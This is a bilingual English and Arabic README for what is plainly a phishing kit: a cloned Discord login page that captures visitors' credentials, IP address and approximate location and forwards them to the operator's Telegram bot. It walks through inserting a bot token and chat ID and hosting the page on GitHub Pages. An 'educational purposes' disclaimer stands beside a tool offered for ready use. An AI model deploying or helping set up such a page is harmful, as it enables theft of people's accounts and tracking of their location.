🎮 Discord Login Page with Telegram Logging
A custom-designed Discord login page clone. When a user attempts to log in, the system captures the login credentials, the user's IP address, and their approximate geographic location, then forwards this data instantly to a specific Telegram Bot.

⚠️ Disclaimer: This project is created strictly for educational purposes, security research, and authorized penetration testing. Do not use it for malicious activities.
<p align="center">
  <img src="https://d26e3f10zvrezp.cloudfront.net/Gallery/108895d8-66a9-44b1-97a8-028e019920cf-711x400.webp" alt="Ghost_XSS Interface" width="100%">
</p>
📸 Preview
🚀 Features
Discord UI Clone: Realistic look and feel of the official Discord login interface.

Telegram Integration: Sends logs directly to your Telegram chat via a bot.

IP & Location Tracking: Automatically fetches the visitor's IP address and location details before sending the payload.

🛠️ Configuration & Setup
To get this project working, you need to configure your Telegram Bot details inside the script.js file.

Open the script.js file.

Locate the configuration object or variables at the top of the file.

Replace the placeholder values with your actual Telegram Bot Token and Chat ID:

JavaScript
const BOT_TOKEN = "YOUR_TELEGRAM_BOT_TOKEN"; // Replace with your Bot Token
const CHAT_ID = "YOUR_TELEGRAM_CHAT_ID";     // Replace with your Chat ID
📂 How to Deploy
Upload all project files (index.html, style.css, script.js, etc.) to your GitHub repository.

Go to your repository Settings.

Scroll down to the GitHub Pages section.

Select the main or master branch as the source and click Save.

Your site will be live at https://yourusername.github.io/your-repo-name/.

📝 README.md (النسخة العربية)
🎮 صفحة تسجيل دخول ديسكورد مدمجة مع بوت تليجرام
هذا المشروع عبارة عن صفحة تسجيل دخول شبيهة بـ Discord. عند محاولة تسجيل الدخول، يقوم النظام بالتقاط بيانات الدخول، عنوان الـ IP الخاص بالجهاز، وموقع الجهاز الجغرافي، ثم يرسل هذه البيانات فوراً إلى بوت تليجرام الخاص بك.

⚠️ إخلاء مسؤولية: هذا المشروع تم إنشاؤه لأغراض تعليمية، وأبحاث الحماية، واختبار الاختراق المصرح به فقط. إخلاء مسؤولية تام عن أي استخدام غير قانوني.

📸 معاينة المشروع
🚀 المميزات
محاكاة واجهة ديسكورد: تصميم واقعي ومطابق لواجهة تسجيل الدخول الرسمية لـ Discord.

الربط مع تليجرام: إرسال البيانات مباشرة إلى محادثتك مع البوت.

صيد الـ IP والموقع: جلب تلقائي لعنوان الـ IP وبيانات الموقع الجغرافي للجهاز الزائر وإرسالها مع البيانات.

🛠️ الإعداد والتشغيل
لكي يعمل المشروع بشكل صحيح، تحتاج إلى إضافة توكن البوت والآي دي الخاص بك داخل ملف script.js.

افتح ملف script.js.

ابحث عن المتغيرات الخاصة بالإعدادات في أعلى الملف.

استبدل القيم الافتراضية ببياناتك الخاصة (توكن البوت والآي دي):

JavaScript
BOT_TOKEN: "التوكن الخاص ببوت التليجرام هنا",
CHAT_ID: "الآي دي الخاص بحسابك هنا"
